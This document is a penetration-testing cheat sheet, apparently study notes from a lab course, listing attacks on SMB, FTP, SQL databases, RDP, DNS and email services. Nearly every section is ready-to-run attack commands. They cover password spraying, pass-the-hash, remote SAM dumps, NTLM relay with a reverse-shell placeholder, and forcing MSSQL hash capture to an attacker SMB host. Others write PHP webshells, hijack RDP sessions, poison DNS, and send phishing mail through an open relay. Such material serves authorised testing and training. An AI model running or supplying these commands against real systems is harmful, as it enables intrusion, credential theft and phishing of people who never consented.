
---

## SMB — Enumeration

```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445

# Null session enumeration
smbclient -N -L //10.129.14.128
smbmap -H 10.129.14.128                          # list shares + permissions
smbmap -H 10.129.14.128 -r notes                # recursive browse
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

# RPC null session
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers

# Automated null session enum
./enum4linux-ng.py 10.10.11.45 -A -C
```

---

## SMB — Password Attacks

```bash
# Password spray with CrackMapExec (netexec)
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
# --continue-on-success = keep spraying after hit
# --local-auth = non-domain target

# Enumerate logged-on users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

# Dump SAM remotely
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Pass-the-Hash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

---

## SMB — Remote Code Execution

```bash
# Impacket PsExec (uploads service binary to ADMIN$)
impacket-psexec administrator:'Password123!'@10.10.110.17

# Impacket SMBExec (no RemComSvc; creates local SMB to receive output)
impacket-smbexec administrator:'Password123!'@10.10.110.17

# Impacket AtExec (via Task Scheduler)
impacket-atexec administrator:'Password123!'@10.10.110.17 whoami

# CrackMapExec exec
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
# uppercase -X = PowerShell commands
```

---

## SMB — Forced Auth / NetNTLMv2 Capture

```bash
# Responder — LLMNR/NBT-NS/MDNS poisoner, captures NTLMv2 hashes
sudo responder -I ens33

# Captured hashes in /usr/share/responder/logs/
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt    # NetNTLMv2 = mode 5600

# NTLM relay instead of cracking
# 1. Disable SMB in Responder: edit /etc/responder/Responder.conf → SMB = Off
# 2. Start relay (dumps SAM by default)
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Relay + exec command (PowerShell reverse shell)
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '<PS_BASE64_CMD>'
```

> [!tip] NTLMv2 hashes are salted (client+server challenge randomized each session) — multiple hashes for the same user are normal.

---

## SMB — Interaction from Windows

```cmd
:: Map share
net use n: \\192.168.220.129\Finance /user:plaintext Password123

:: Count files
dir n: /a-d /s /b | find /c ":\"

:: Search by filename
dir n:\*cred* /s /b

:: Search file contents
findstr /s /i cred n:\*.*
```

```powershell
# Mount with credentials
$cred = New-Object System.Management.Automation.PSCredential 'plaintext', (ConvertTo-SecureString 'Password123' -AsPlainText -Force)
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

# Count files
(Get-ChildItem -File -Recurse | Measure-Object).Count

# Search filename
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

# Search file content
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

---

## SMB — Linux Mount

```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

# Credential file alternative
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credfile
# credfile format: username=X\npassword=X\ndomain=X

# Hunt after mounting
find /mnt/Finance/ -name *cred*
grep -rn /mnt/Finance/ -ie cred
```

---

## FTP — Enumeration & Anonymous Access

```bash
sudo nmap -sC -sV -p 21 192.168.2.142      # ftp-anon script checks anonymous login

# Anonymous login
ftp 192.168.2.142
# Name: anonymous, Password: (blank)

# FTP client commands
ls, cd, get <file>, mget <files>, put <file>, mput <files>, help
```

**FTP Brute Force:**

```bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```

**FTP Bounce Attack** (scan internal hosts via FTP):

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
# Requires PORT command not blocked; uses FTP_DMZ to scan Internal_DMZ
```

---

## SQL Databases — Enumeration

```bash
# MSSQL: TCP/1433 (normal), TCP/2433 (hidden mode), UDP/1434
# MySQL: TCP/3306
nmap -Pn -sV -sC -p1433 10.10.10.125
```

---

## SQL Databases — Connect

```bash
# MSSQL from Linux
sqsh -S 10.129.20.13 -U username -P Password123
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h        # Windows auth
mssqlclient.py -p 1433 julio@10.129.203.7                   # Impacket

# MySQL from Linux
mysql -u username -pPassword123 -h 10.10.10.13

# MSSQL from Windows
sqlcmd -S 10.129.20.13 -U username -P Password123 -y 30 -Y 30
```

---

## SQL — Essential T-SQL Syntax

```sql
-- MSSQL
SELECT name FROM master.dbo.sysdatabases; GO
USE htbusers; GO
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES; GO
SELECT * FROM users; GO

-- MySQL
SHOW DATABASES;
USE htbusers;
SHOW TABLES;
SELECT * FROM users;
```

---

## SQL — Command Execution

```sql
-- MSSQL: xp_cmdshell (disabled by default)
xp_cmdshell 'whoami'
GO

-- Enable xp_cmdshell (needs sysadmin)
EXECUTE sp_configure 'show advanced options', 1; GO; RECONFIGURE; GO
EXECUTE sp_configure 'xp_cmdshell', 1; GO; RECONFIGURE; GO
```

---

## SQL — File Read / Write

```sql
-- MSSQL read file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO

-- MySQL read (needs FILE priv + secure_file_priv='')
SELECT LOAD_FILE("/etc/passwd");

-- Check secure_file_priv (empty = unrestricted)
SHOW VARIABLES LIKE "secure_file_priv";

-- MySQL write webshell
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

-- MSSQL write file (needs Ole Automation enabled)
sp_configure 'Ole Automation Procedures', 1; GO; RECONFIGURE; GO
DECLARE @OLE INT; DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE; GO
```

---

## SQL — Capture MSSQL Service Hash (xp_dirtree / xp_subdirs)

MSSQL connects to attacker SMB via `xp_dirtree`/`xp_subdirs` → sends NTLMv2 hash of service account.

```sql
-- Both work; point to attacker's SMB server
EXEC master..xp_dirtree '\\10.10.110.17\share\'; GO
EXEC master..xp_subdirs '\\10.10.110.17\share\'; GO
```

```bash
# Catch hash with Responder
sudo responder -I tun0
hashcat -m 5600 hash.txt rockyou.txt

# Or impacket SMB server
sudo impacket-smbserver share ./ -smb2support
```

---

## SQL — Impersonation & Linked Servers

```sql
-- Find users we can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Check current user + sysadmin role (0=no, 1=yes)
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); GO

-- Impersonate sa
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin'); GO
REVERT  -- revert impersonation

-- Note: run EXECUTE AS LOGIN within master DB to avoid access errors

-- Find linked servers (isremote=1 = remote, 0 = linked)
SELECT srvname, isremote FROM sysservers; GO

-- Execute query on linked server
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
-- Use semicolons to chain multiple commands
```

---

## RDP — Enumeration & Attacks

```bash
nmap -Pn -p3389 192.168.2.143

# Password spray
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp -t 4 -W 3

# Connect
rdesktop -u admin -p password123 192.168.2.142
xfreerdp /v:192.168.220.152 /u:lewen /p:password123
```

**RDP Pass-the-Hash:**

```bash
# Requires DisableRestrictedAdmin = 0 on target
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

**RDP Session Hijacking** (requires SYSTEM on target):

```cmd
query user                           # find target SESSION_ID + our session name

# Create service that runs tscon as SYSTEM
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
net start sessionhijack
```

> [!warning] Session hijacking via `sc.exe` + `tscon` no longer works on Windows Server 2019. Requires local admin → SYSTEM (PsExec, Mimikatz, etc.) first.

---

## DNS — Zone Transfer & Subdomain Enumeration

```bash
# Zone transfer
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
fierce --domain zonetransfer.me                    # auto-enumerate + attempt AXFR

# Subdomain enumeration
./subfinder -d inlanefreight.com -v
./subbrute.py inlanefreight.com -s names.txt -r resolvers.txt   # internal (no internet needed)

# Check CNAME for subdomain takeover candidate
host support.inlanefreight.com
# If alias points to expired S3/CDN → potential takeover

# Reference: https://github.com/EdOverflow/can-i-take-over-xyz
```

**DNS Cache Poisoning (local network via Ettercap):**

```bash
# Edit /etc/ettercap/etter.dns:
# inlanefreight.com    A   192.168.225.110
# *.inlanefreight.com  A   192.168.225.110

ettercap  # Hosts > Scan → add target to Target1, gateway to Target2
          # Plugins > Manage > dns_spoof → activate
```

---

## Email (SMTP/IMAP/POP3) — Enumeration

**Identify mail server:**

```bash
host -t MX hackthebox.eu
dig mx inlanefreight.com | grep "MX" | grep -v ";"

# Nmap scan common mail ports
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

**SMTP user enumeration (manual):**

```bash
telnet 10.10.110.20 25
VRFY root            # 252 = exists, 550 = unknown
EXPN support-team    # lists distribution list members
MAIL FROM:test@htb.com
RCPT TO:john         # 250 = exists, 550 = unknown
```

**POP3 user enum:**

```bash
telnet 10.10.110.20 110
USER julio           # -ERR = unknown, +OK = exists
```

**Automated SMTP user enum:**

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
# Modes: VRFY, EXPN, RCPT
```

**O365 enumeration:**

```bash
python3 o365spray.py --validate --domain msplaintext.xyz     # confirm O365
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

---

## Email — Password Attacks

```bash
# Hydra against POP3/IMAP/SMTP
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
hydra -L users.txt -P passwords.txt 10.10.110.20 smtp

# O365 password spray
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
# --count = passwords per spray, --lockout = minutes between rounds

# CredKing for Gmail/Okta
# MailSniper for Exchange/O365
```

---

## Email — Open Relay (SMTP Phishing)

```bash
# Detect open relay
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

# Send phishing email through open relay
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Click: http://phish.example.com/' \
      --server 10.10.11.213
```

---

> [!tip] Chain of discovery: anonymous FTP → find username → try against email → find DB creds in inbox → xp_cmdshell → RCE. Every piece of information (even an empty file named `johnsmith`) is a pivot point.

> [!warning] Password spraying against AD accounts: default lockout policy may not exist, but if it does, 2-3 attempts safe with 30-60 min gap. MSSQL xp_dirtree hash capture also works via vulnerable web apps with SQLi — not just direct DB connections.